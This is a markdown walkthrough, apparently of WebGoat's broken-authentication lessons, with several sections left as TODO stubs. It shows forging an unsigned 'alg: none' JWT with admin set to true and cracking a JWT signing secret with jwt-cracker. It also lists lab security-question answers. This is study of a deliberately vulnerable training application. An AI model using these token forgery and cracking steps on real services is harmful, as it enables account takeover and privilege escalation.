<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [A2 - Broken Authentication](#a2---broken-authentication)
  - [Authentication Bypass](#authentication-bypass)
  - [JWT tokens](#jwt-tokens)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# A2 - Broken Authentication

## Authentication Bypass

### 1. Authentication Bypasses

- Hidden inputs
- Removing Parameters
- Forced Browsing

### 2. 2FA Password Reset

TODO

## JWT tokens

### 1. Concept

### 2. Structure of a JWT token

structure: `header.claims.signature`

### 3. Authentication and getting a JWT token

|Browser||Server|
|-|-|-|
|| --- 1. POST /users/login with username and password ---&gt; ||
||| 2. create a JWT with a secret |
|| &lt;--- 3. returns the JWT to the Browser --- ||
|| --- 4. sends the JWT on the Authorization Header ---&gt; ||
||| 5. check JWT signature. Get user information from the JWT |
|| &lt;--- sends response to the client --- ||

### 4. JWT signing

JWT token: `eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MTE4NjY3OTEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ.Xk8SK-rQYytVU7fQmYSEv8e1e2hnMrR4ljjNIylpNjzKNMx-oZ1Zt35NzmlFXaR5Qkj0YeT25ZFbGiR84UcWAQ`

```sh
$ echo -n eyJhbGciOiJIUzUxMiJ9 | base64 -d
{"alg":"HS512"}

$ echo -n eyJpYXQiOjE2MTE4NjY3OTEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ== | base64 -d
{"iat":1611866791,"admin":"false","user":"Jerry"}
```

```sh
$ echo -n '{"alg":"none"}' | base64
eyJhbGciOiJub25lIn0=

$ echo -n '{"iat":1611866791,"admin":"true","user":"Jerry"}' | base64
eyJpYXQiOjE2MTE4NjY3OTEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9
```

Exploit:

JWT token: `eyJhbGciOiJub25lIn0.eyJpYXQiOjE2MTE4NjY3OTEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.`

### 5. JWT cracking

JWT token: `eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTAwMTQ1NiwiZXhwIjoxNjExMDAxNTE2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.3ngFGIX-epPtQFF53n8nNmO2DWZR05pEeb0wqSeKgvk`

```sh
# npm install --global jwt-cracker
$ time jwt-cracker "eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTAwMTQ1NiwiZXhwIjoxNjExMDAxNTE2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.3ngFGIX-epPtQFF53n8nNmO2DWZR05pEeb0wqSeKgvk"
```

TODO jwt-cracker output

$ echo -n eyJhbGciOiJIUzI1NiJ9 | base64 -d
{"alg":"HS256"}

$ echo -n eyJpc3MiOieyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTAwMTQ1NiwiZXhwIjoxNjExMDAxNTE2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19 | base64 -d
{"iss":"WebGoat Token Builder","aud":"webgoat.org","iat":1611001456,"exp":1611001516,"sub":"tom@webgoat.org","username":"Tom","Email":"tom@webgoat.org","Role":["Manager","Project Administrator"]}


{"iss":"WebGoat Token Builder","aud":"webgoat.org","iat":1611001456,"exp":1611001516,"sub":"tom@webgoat.org","username":"WebGoat","Email":"tom@webgoat.org","Role":["Manager","Project Administrator"]}

### 6. Refreshing a token

```sh
$ curl -X POST -H -d 'username=webgoat&password=webgoat' localhost:8080/WebGoat/login

{
    "token_type":"bearer",
    "access_token":"XXXX.YYYY.ZZZZ",
    "expires_in":10,
    "refresh_token":"4a9a0b1eac1a34201b3c5659944e8b7"
}
```

The best place to use a JWT token is between server to server communications. 
In a normal web application you are better of using plain old cookies.

### 7. Refreshing a token

TODO find the way to use refresh_token (Jerry) in order to refresh logfile token (Tom)

### 8. Final Challenges

$ echo -n eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0= | base64 -d
{"typ":"JWT","kid":"webgoat_key","alg":"HS256"}

kid = webgoat_key

TODO

## Password reset

### 1. Concept

### 2. Email functionality with WebWolf

### 3. Find out if account exists

### 4. Security questions

username: `tom`
favourite color: `purple`

username: `admin`
favourite color: `green`

username: `larry`
favourite color: `yellow`

### 5. The Problem with Security Questions

The "perfect" security question should be hard to crack, but easy to remember.

### 6. Creating the password reset link

Make sure the link:

- is a unique link with a random token
- can only be used once
- is only valid for a limited amount of time.

Reset the password of Tom (tom@webgoat-cloud.org)

TODO

### 7. How to prevent abusing the password reset function

## Secure Passwords

